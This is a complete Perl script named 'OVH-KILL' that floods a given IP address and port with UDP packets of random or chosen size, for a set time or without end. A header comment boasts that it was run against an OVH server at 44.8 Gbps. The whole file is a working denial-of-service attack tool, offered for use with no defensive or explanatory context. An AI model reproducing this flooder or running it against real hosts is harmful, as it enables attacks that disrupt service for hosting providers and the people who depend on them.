#!/usr/bin/perl
# succ 
# Executed Script On a OVH lmao, Highest Output Was 44.8GBPS
 
use Socket;
use strict;
 
if ($#ARGV != 3) {
  print " ~ OVH-KILL, a Generic UDP Packet Flood\n";
  print "   ------------------------------------\n";
  print " ~ ovh-kill.pl <IP> <Port> <1250> <Time>\n\n";
  print " ~ Port=0: Uses Random Ports\n";
  print " ~ Size=65500: Uses a Random PSize\n";
  print " ~ Time=0: Continuous Flood\n";
  exit(1);
}
 
my ($ip,$port,$size,$time) = @ARGV;
 
my ($iaddr,$endtime,$psize,$pport);
 
$iaddr = inet_aton("$ip") or die "Cannot resolve hostname $ip\n";
$endtime = time() + ($time ? $time : 1000000);
 
socket(flood, PF_INET, SOCK_DGRAM, 17);
 
 print <<EOTEXT; 
          
          â•”â•â•—â”Œâ” â”¬ â”¬â”Œâ”¬â”â”¬ â”¬â”Œâ”€â”â”Œâ”¬â”
          â•‘ â•‘â”œâ”´â”â”‚ â”‚ â”‚â”‚â”‚ â”‚â”‚   â”‚ 
          â•šâ•â•â””â”€â”˜â””â”€â”˜â”€â”´â”˜â””â”€â”˜â””â”€â”˜ â”´ v2.2 Transmissional. Capabilities Exceed.

EOTEXT
print "Attacking $ip " . ($port ? $port : "random") . " Port With " .
  ($size ? "$size-Byte" : "Random Size") . " Packets" .
  ($time ? " For $time Seconds" : "") . "\n";
print "Break with Ctrl+C\n" unless $time;
 
for (;time() <= $endtime;) {
  $psize = $size ? $size : int(rand(1024-64)+64) ;
  $pport = $port ? $port : int(rand(65500))+1;
 
  send(flood, 
pack("a$psize","saf3e368wumu7repa4uxa2rucHaphubeGamu9R3373af8Us3eTHUgepRAfAS2c6CHAyegURepUbre94wRAwruS2uhU8UXasp7spasw7sw8h7wapr5spabekumu8ast8StRadusASacu6a6e5efrAzeWucH5cumuswaraca7hAbrewrecujetrafefadrawruW4ayAjU37sPUseBr4cRuPhacrUtrf0azrrQlLd1xdSjjtdwXfjyXArkExrVxVlulxssmr0u0lRscLAqjkZB43ajPRmAH4JQ6T1SOZPFmndbEi4IUOIuUmPCXI044f73uGIeJHs8lh36KpJausXqykL2idPx1j120Rra2DI1kmGgde5LI4TJMuQvrotBR3Fli0g1uwt74ALKfRzHYZJR0wkqNncUY178LcbTFtx5n7MF4zX3P4Z3mUVkAebkXqDv6EETKTNBes9kW2QBEBLeKcBH4cUAQ8Y30mdGozVRNJq3wtDMmgtzCibqXEEp3cZATTOMqIDxn3t5HYdspEofPneXpPTUE0TBN8oRAp4DjSlhfDAVmfNgbdSbTHWT7Y7gVi6kgrNXKCM64V4kOGvesVr0SZU3k83r6qAr3w4d26kurU9eBRa53cEtRaQaCHEvacu4PETRaf3yepHAk9FAgU2at8GEMEZAwUjaDesTufu2r3DaPhedR7quCru7reketc8atacAStuGeFruNuTHaWuspabr6drARa4r4cApRewuFRaD3qAXAsPeMAChudRUWxuq73R5dra8epre4tasp8craq677wru5asuq3tradede8rethuSwAfespastuduypUt2fudra5utanewrat83rucruyuje6aphuprUWawrawr4tha922HeSpU8acacu5hastuprecevasteberepagas6ejuje2heswugukerebrajeVeswerajAdagecah3phE9EsutaFrU6erathu2u6utraseCrEjehaChuphEchepeswutrezu86pret6afayouwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?"), 
0, pack_sockaddr_in($pport, $iaddr));}